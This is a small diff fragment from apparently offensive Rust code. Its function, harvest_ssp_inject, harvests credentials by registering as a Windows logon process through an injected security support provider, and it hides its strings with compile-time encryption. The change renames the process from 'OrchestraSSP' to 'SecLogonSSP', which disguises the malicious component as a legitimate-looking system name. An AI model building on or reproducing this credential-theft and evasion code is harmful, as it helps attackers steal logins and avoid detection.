@@ -660,7 +660,7 @@ fn harvest_ssp_inject(timeout_secs: u64) -> Result<Vec<WhisperedCredential>> {
 
     // Try to register as a logon process (requires SeTcbPrivilege / admin).
     let proc_name =
-        String::from_utf8_lossy(&string_crypt::enc_str!("OrchestraSSP\0"))
+        String::from_utf8_lossy(&string_crypt::enc_str!("SecLogonSSP\0"))
             .trim_end_matches('\0')
             .to_string();
     let proc_name_wide: Vec<u16> = proc_name.encode_utf16().collect();
